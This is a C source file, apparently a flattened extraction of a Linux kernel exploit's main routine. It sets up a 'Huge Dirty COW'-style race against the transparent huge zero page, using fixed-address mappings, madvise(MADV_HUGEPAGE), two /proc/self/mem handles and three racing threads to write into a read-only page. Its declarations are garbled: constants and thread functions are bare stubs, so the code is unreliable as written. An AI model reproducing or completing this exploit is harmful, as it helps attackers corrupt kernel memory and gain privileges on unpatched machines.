
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct thread_args {void* thp_map; void* thp_chk_map; scalar_t__ mem_fd1; scalar_t__ mem_fd2; int off; int buf_to_write; scalar_t__ stop; } ;
typedef int pthread_t ;
typedef int pthread_proc ;


 int MADV_HUGEPAGE ;
 int MAP_ANONYMOUS ;
 void* MAP_BASE ;
 void* MAP_FAILED ;
 int MAP_PRIVATE ;
 int MAP_SIZE ;
 int MEMESET_VAL ;
 int O_RDWR ;
 scalar_t__ PAGE_SIZE ;
 int PROT_READ ;
 int close (scalar_t__) ;
 int fprintf (int ,char*) ;
 int free (int ) ;
 int madvise (void*,int,int ) ;
 int malloc (scalar_t__) ;
 int memset (int ,int ,scalar_t__) ;
 void* mmap (void*,int,int ,int,int,int ) ;
 int munmap (void*,int) ;
 void* open (char*,int ) ;
 int perror (char*) ;
 int printf (char*,...) ;
 int pthread_create (int *,int *,int ,struct thread_args*) ;
 int pthread_join (int ,int *) ;
 int stderr ;
 scalar_t__ unmap_and_read_thread ;
 scalar_t__ wait_for_success ;
 scalar_t__ write_thread ;

int main() {
    struct thread_args args;
    void *thp_chk_map_addr;
    int ret;


    args.thp_map = mmap(MAP_BASE, MAP_SIZE, PROT_READ, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (args.thp_map == MAP_FAILED) {
        perror("[!] mmap()");
        return -1;
    }
    if (args.thp_map != MAP_BASE) {
        fprintf(stderr, "[!] Didn't get desired base address for the vulnerable mapping.\n");
        goto err_unmap1;
    }

    printf("[*] The beginning of the zero huge page: %lx\n", *(unsigned long *)args.thp_map);

    thp_chk_map_addr = (char *)MAP_BASE + (MAP_SIZE * 2);
    args.thp_chk_map = mmap(thp_chk_map_addr, MAP_SIZE, PROT_READ, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (args.thp_chk_map == MAP_FAILED) {
        perror("[!] mmap()");
        goto err_unmap1;
    }
    if (args.thp_chk_map != thp_chk_map_addr) {
        fprintf(stderr, "[!] Didn't get desired base address for the check mapping.\n");
        goto err_unmap2;
    }

    ret = madvise(args.thp_map, MAP_SIZE, MADV_HUGEPAGE);
    ret |= madvise(args.thp_chk_map, MAP_SIZE, MADV_HUGEPAGE);
    if (ret) {
        perror("[!] madvise()");
        goto err_unmap2;
    }

    args.buf_to_write = malloc(PAGE_SIZE);
    if (!args.buf_to_write) {
        perror("[!] malloc()");
        goto err_unmap2;
    }
    memset(args.buf_to_write, MEMESET_VAL, PAGE_SIZE);

    args.mem_fd1 = open("/proc/self/mem", O_RDWR);
    if (args.mem_fd1 < 0) {
        perror("[!] open()");
        goto err_free;
    }

    args.mem_fd2 = open("/proc/self/mem", O_RDWR);
    if (args.mem_fd2 < 0) {
        perror("[!] open()");
        goto err_close1;
    }

    printf("[*] Racing. Gonna take a while...\n");
    args.off = 0;


    while (args.off < MAP_SIZE) {
        pthread_t threads[3];
        args.stop = 0;

        ret = pthread_create(&threads[0], ((void*)0), (pthread_proc)wait_for_success, &args);
        ret |= pthread_create(&threads[1], ((void*)0), (pthread_proc)unmap_and_read_thread, &args);
        ret |= pthread_create(&threads[2], ((void*)0), (pthread_proc)write_thread, &args);

        if (ret) {
            perror("[!] pthread_create()");
            goto err_close2;
        }

        pthread_join(threads[0], ((void*)0));
        pthread_join(threads[1], ((void*)0));
        pthread_join(threads[2], ((void*)0));

        args.off += PAGE_SIZE;
        printf("[*] Done 0x%lx bytes\n", args.off);
    }

    printf("[*] Success!\n");

err_close2:
    close(args.mem_fd2);
err_close1:
    close(args.mem_fd1);
err_free:
    free(args.buf_to_write);
err_unmap2:
    munmap(args.thp_chk_map, MAP_SIZE);
err_unmap1:
    munmap(args.thp_map, MAP_SIZE);

    if (ret) {
        fprintf(stderr, "[!] Exploit failed.\n");
    }

    return ret;
}
